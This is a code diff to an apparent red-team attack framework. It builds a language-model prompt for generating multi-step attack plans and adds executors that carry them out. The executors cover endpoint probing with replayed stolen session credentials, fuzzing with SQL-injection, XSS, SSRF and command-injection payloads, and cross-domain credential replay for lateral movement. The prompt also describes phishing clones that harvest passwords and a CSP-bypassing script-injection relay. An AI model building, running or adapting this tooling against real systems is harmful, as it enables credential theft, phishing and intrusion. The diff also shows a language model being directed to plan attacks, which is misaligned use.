@@ -277,30 +277,51 @@ async def generate_attack_plan(sid: str, body: PlanGenerateRequest, request: Req
         f"AVAILABLE CREDENTIALS:\n{json.dumps(cred_summary, default=str)}\n\n"
         + (f"ATTACK GRAPH:\n{graph_summary}\n\n" if graph_summary else "")
         + (f"CONFIRMED PIVOT RESULTS:\n{pivot_summary}\n\n" if pivot_summary else "")
-        + 'Each step is one of:\n'
-        '- "browser": JavaScript snippet injected into the target page via Chrome extension '
-        '(MAIN world — full cookie, DOM, localStorage access). '
-        'Use console.log("[R3D TEST] ...") for all output.\n'
-        '- "server": HTTP request executed server-side with replayed auth credentials.\n'
+        + 'Each step is one of these types (prefer templated types over browser):\n'
+        '- "server": Single HTTP request with replayed auth credentials. '
+        'Provide {method, url, sourceOrigin, body}.\n'
+        '- "scan": Batch-probe multiple endpoints in parallel. '
+        'Provide {probes: [{url, method}], useAuthContext}. '
+        'The proxy fires all probes server-side with captured session credentials '
+        'and reports status/body for each. '
+        'USE THIS instead of browser steps that loop over endpoints.\n'
+        '- "fuzz": Parameter fuzzing with built-in payload libraries. '
+        'Provide {fuzzConfig: {url, method, paramPositions: [{name, position, original}], '
+        'payloadSets: ["sqli","xss","ssrf","idor","path-traversal","command-injection"], maxRequests}}. '
+        'The proxy mutates each parameter position with the payload library and reports anomalies. '
+        'USE THIS instead of browser steps that iterate payloads.\n'
+        '- "pivot": Credential replay across systems to test lateral movement. '
+        'Provide {pivotConfig: {sourceOrigin, targetDomain, targetPaths: ["/api/me", "/"]}}. '
+        'The proxy replays cookies/headers from sourceOrigin against targetDomain '
+        'and reports which paths return authenticated responses. '
+        'USE THIS for lateral movement testing.\n'
         '- "phish": Clone a target login page as a credential-harvesting phish site. '
-        'The proxy handles EVERYTHING: fetches the page with captured auth context, '
-        'rewrites all URLs, injects credential capture hooks (form submit, password blur, '
-        'fetch/XHR intercept, dynamic form detection, cookie/storage snapshot). '
-        'Just provide the target URL — no JavaScript snippet needed. '
-        'Output is the victim-facing serve URL. Use this for social engineering steps.\n\n'
-        "CSP-SAFE PROXY RELAY FOR BROWSER STEPS:\n"
+        'Provide {phishTarget}. The proxy clones the page with captured auth context, '
+        'injects credential capture hooks (form, password blur, fetch/XHR, MutationObserver, '
+        'cookie/storage snapshot), and serves it. Zero JS needed. '
+        'Output is the victim-facing serve URL.\n'
+        '- "browser": JavaScript snippet injected into the target page via Chrome extension '
+        '(MAIN world). ONLY use this when you genuinely need DOM access '
+        '(read localStorage, document.cookie, inspect rendered page content). '
+        'For HTTP requests use server. For batch probing use scan. '
+        'For fuzzing use fuzz. For lateral movement use pivot. '
+        'For credential harvesting use phish. '
+        'Use console.log("[R3D TEST] ...") for all output.\n\n'
+        "CSP-SAFE PROXY RELAY (browser steps only):\n"
         "The target page's CSP BLOCKS fetch() to arbitrary origins. Browser snippets MUST use "
         "window.__r3d_proxy(endpoint, body) instead of fetch() to reach the proxy. This relay "
         "routes through the Chrome extension's service worker which bypasses page CSP.\n"
         "  await window.__r3d_proxy('r3d/test/beacon', {data: 'proof'})\n"
         "  await window.__r3d_proxy('r3d/attack/fetch', {url, method, headers, body})\n"
         "  await window.__r3d_proxy('r3d/attack/validate-token', {accessToken, userinfoUrl, headers})\n"
-        "  await window.__r3d_proxy('r3d/attack/phish/clone', {url, useAuthContext: true})\n"
         "NEVER use fetch() to reach the proxy in browser snippets. ALWAYS use window.__r3d_proxy().\n\n"
         "RULES:\n"
+        "- NEVER use browser steps for HTTP requests, scanning, fuzzing, or credential replay. "
+        "Use server/scan/fuzz/pivot instead — they are fixed templates with zero error surface.\n"
+        "- browser steps are ONLY for DOM access: reading localStorage, document.cookie, "
+        "inspecting rendered page content, or interacting with page elements.\n"
         "- Earlier steps can extract data that later steps use. "
         "Reference prior step output with {{step.N.output}} placeholders.\n"
-        "- Prefer server-side when the attack doesn't require DOM access.\n"
         "- Use phish steps when the objective involves credential harvesting or social engineering.\n"
         "- Each step MUST have clear success/failure criteria.\n"
         f"- Maximum {body.maxSteps} steps. Prioritize by impact.\n\n"
@@ -309,12 +330,16 @@ async def generate_attack_plan(sid: str, body: PlanGenerateRequest, request: Req
         '"summary" — 2-3 sentence description of the attack chain\n'
         '"steps" — array of objects, each with:\n'
         '  "index" — step number (0-based)\n'
-        '  "type" — "browser", "server", or "phish"\n'
+        '  "type" — "server", "scan", "fuzz", "pivot", "phish", or "browser"\n'
         '  "target" — full URL or origin\n'
         '  "objective" — what this step proves or extracts\n'
-        '  "snippet" — (browser only) JavaScript to inject\n'
-        '  "request" — (server only) object with "method", "url", "sourceOrigin" (whose creds to use), optional "body"\n'
+        '  "request" — (server only) {method, url, sourceOrigin, body}\n'
+        '  "probes" — (scan only) [{url, method}] array of endpoints to probe\n'
+        '  "useAuthContext" — (scan/fuzz) inject captured session credentials, default true\n'
+        '  "fuzzConfig" — (fuzz only) {url, method, paramPositions: [{name, position, original}], payloadSets, maxRequests}\n'
+        '  "pivotConfig" — (pivot only) {sourceOrigin, targetDomain, targetPaths}\n'
         '  "phishTarget" — (phish only) full URL to clone as credential-harvesting page\n'
+        '  "snippet" — (browser only) JavaScript to inject\n'
         '  "successCriteria" — string describing what output means success\n'
         '  "feedsInto" — array of step indexes that depend on this step\'s output\n'
     )
@@ -382,6 +407,23 @@ async def execute_attack_plan(sid: str, body: PlanExecuteRequest, request: Reque
                     resolved_request["url"] = resolved_request["url"].replace(placeholder, safe_output)
                 if isinstance(resolved_request.get("body"), str):
                     resolved_request["body"] = resolved_request["body"].replace(placeholder, safe_output)
+                for probe in step.get("probes", []):
+                    if isinstance(probe.get("url"), str):
+                        probe["url"] = probe["url"].replace(placeholder, safe_output)
+                fuzz_cfg = step.get("fuzzConfig", {})
+                if isinstance(fuzz_cfg.get("url"), str):
+                    fuzz_cfg["url"] = fuzz_cfg["url"].replace(placeholder, safe_output)
+                for pp in fuzz_cfg.get("paramPositions", []):
+                    if isinstance(pp.get("original"), str):
+                        pp["original"] = pp["original"].replace(placeholder, safe_output)
+                pivot_cfg = step.get("pivotConfig", {})
+                if isinstance(pivot_cfg.get("sourceOrigin"), str):
+                    pivot_cfg["sourceOrigin"] = pivot_cfg["sourceOrigin"].replace(placeholder, safe_output)
+                if isinstance(pivot_cfg.get("targetDomain"), str):
+                    pivot_cfg["targetDomain"] = pivot_cfg["targetDomain"].replace(placeholder, safe_output)
+                phish_target = step.get("phishTarget", "")
+                if isinstance(phish_target, str) and placeholder in phish_target:
+                    step["phishTarget"] = phish_target.replace(placeholder, safe_output)
 
             result = {"index": idx, "type": step_type, "target": target, "objective": objective}
 
@@ -461,6 +503,145 @@ async def execute_attack_plan(sid: str, body: PlanExecuteRequest, request: Reque
                     result["output"] = ""
                     result["error"] = str(exc)
                     result["status"] = "error"
+
+            elif step_type == "scan":
+                probes = step.get("probes", [])
+                use_auth = step.get("useAuthContext", True)
+                if not probes:
+                    probes = [{"url": target, "method": "GET"}]
+                scan_results: list[dict] = []
+                for probe in probes[:50]:
+                    await throttle()
+                    probe_url = probe.get("url", target)
+                    probe_method = probe.get("method", "GET")
+                    try:
+                        p = urlparse(probe_url)
+                        origin = f"{p.scheme}://{p.netloc}"
+                    except Exception:
+                        origin = ""
+                    headers = get_replay_headers(origin, {}) if use_auth else {}
+                    try:
+                        async with get_http_client(timeout=10, follow_redirects=True) as client:
+                            resp = await client.request(method=probe_method, url=probe_url, headers=headers)
+                        scan_results.append({
+                            "url": probe_url, "method": probe_method,
+                            "status": resp.status_code, "bodySize": len(resp.text),
+                            "bodyPreview": resp.text[:500],
+                        })
+                    except Exception as exc:
+                        scan_results.append({"url": probe_url, "method": probe_method, "error": str(exc)})
+
+                hits = [r for r in scan_results if r.get("status", 0) < 400 and r.get("bodySize", 0) > 50]
+                result["output"] = json.dumps({"total": len(scan_results), "hits": len(hits), "results": scan_results}, default=str)
+                result["status"] = "success"
+                result["scanResults"] = scan_results
+
+            elif step_type == "fuzz":
+                from core.replay import payloads as payload_lib
+
+                fuzz_cfg = step.get("fuzzConfig", {})
+                fuzz_url = fuzz_cfg.get("url", target)
+                fuzz_method = fuzz_cfg.get("method", "GET")
+                param_positions = fuzz_cfg.get("paramPositions", [])
+                payload_sets = fuzz_cfg.get("payloadSets", [])
+                max_requests = min(fuzz_cfg.get("maxRequests", 50), 100)
+                use_auth = fuzz_cfg.get("useAuthContext", True)
+
+                all_payloads: list[str] = []
+                for ps in payload_sets:
+                    all_payloads.extend(payload_lib.get(ps, []))
+                if not all_payloads:
+                    all_payloads = ["' OR 1=1--", "<script>alert(1)</script>", "{{7*7}}", "../etc/passwd"]
+
+                try:
+                    p = urlparse(fuzz_url)
+                    fuzz_origin = f"{p.scheme}://{p.netloc}"
+                except Exception:
+                    fuzz_origin = ""
+                base_headers = get_replay_headers(fuzz_origin, {}) if use_auth else {}
+
+                baseline_body = ""
+                baseline_status = 0
+                try:
+                    async with get_http_client(timeout=10, follow_redirects=True) as client:
+                        baseline_resp = await client.request(method=fuzz_method, url=fuzz_url, headers=base_headers)
+                    baseline_status = baseline_resp.status_code
+                    baseline_body = baseline_resp.text
+                except Exception:
+                    pass
+
+                fuzz_results: list[dict] = []
+                anomalies: list[dict] = []
+                req_count = 0
+                for payload in all_payloads[:max_requests]:
+                    await throttle()
+                    req_count += 1
+                    mutated_url = fuzz_url
+                    for pp in param_positions:
+                        orig = pp.get("original", "")
+                        if orig and orig in mutated_url:
+                            mutated_url = mutated_url.replace(orig, payload, 1)
+                    try:
+                        async with get_http_client(timeout=10, follow_redirects=True) as client:
+                            resp = await client.request(method=fuzz_method, url=mutated_url, headers=base_headers)
+                        entry = {
+                            "payload": payload[:100], "url": mutated_url,
+                            "status": resp.status_code, "bodySize": len(resp.text),
+                        }
+                        is_anomaly = (
+                            resp.status_code != baseline_status
+                            or abs(len(resp.text) - len(baseline_body)) > max(100, len(baseline_body) * 0.2)
+                        )
+                        if is_anomaly:
+                            entry["bodyPreview"] = resp.text[:300]
+                            entry["anomaly"] = True
+                            anomalies.append(entry)
+                        fuzz_results.append(entry)
+                    except Exception as exc:
+                        fuzz_results.append({"payload": payload[:100], "url": mutated_url, "error": str(exc)})
+
+                result["output"] = json.dumps({
+                    "totalRequests": req_count, "anomalies": len(anomalies),
+                    "topAnomalies": anomalies[:10], "baselineStatus": baseline_status,
+                }, default=str)
+                result["status"] = "success" if anomalies else "success"
+                result["fuzzResults"] = {"total": req_count, "anomalies": anomalies}
+
+            elif step_type == "pivot":
+                pivot_cfg = step.get("pivotConfig", {})
+                source_origin = pivot_cfg.get("sourceOrigin", "")
+                target_domain = pivot_cfg.get("targetDomain", "")
+                target_paths = pivot_cfg.get("targetPaths", ["/"])
+
+                if not source_origin or not target_domain:
+                    result["output"] = ""
+                    result["error"] = "pivotConfig requires sourceOrigin and targetDomain"
+                    result["status"] = "error"
+                else:
+                    replay_headers = get_replay_headers(source_origin, {})
+                    pivot_results: list[dict] = []
+                    for path in target_paths[:10]:
+                        await throttle()
+                        probe_url = f"https://{target_domain}{path}"
+                        try:
+                            async with get_http_client(timeout=10, follow_redirects=True) as client:
+                                resp = await client.get(probe_url, headers=replay_headers)
+                            is_authed = resp.status_code < 400 and resp.status_code not in (301, 302)
+                            pivot_results.append({
+                                "url": probe_url, "status": resp.status_code,
+                                "authenticated": is_authed,
+                                "bodyPreview": resp.text[:500] if is_authed else "",
+                            })
+                        except Exception as exc:
+                            pivot_results.append({"url": probe_url, "error": str(exc), "authenticated": False})
+
+                    confirmed = [r for r in pivot_results if r.get("authenticated")]
+                    result["output"] = json.dumps({
+                        "confirmed": len(confirmed), "total": len(pivot_results),
+                        "results": pivot_results,
+                    }, default=str)
+                    result["status"] = "success" if confirmed else "failed"
+                    result["pivotResults"] = pivot_results
 
             else:
                 req = resolved_request
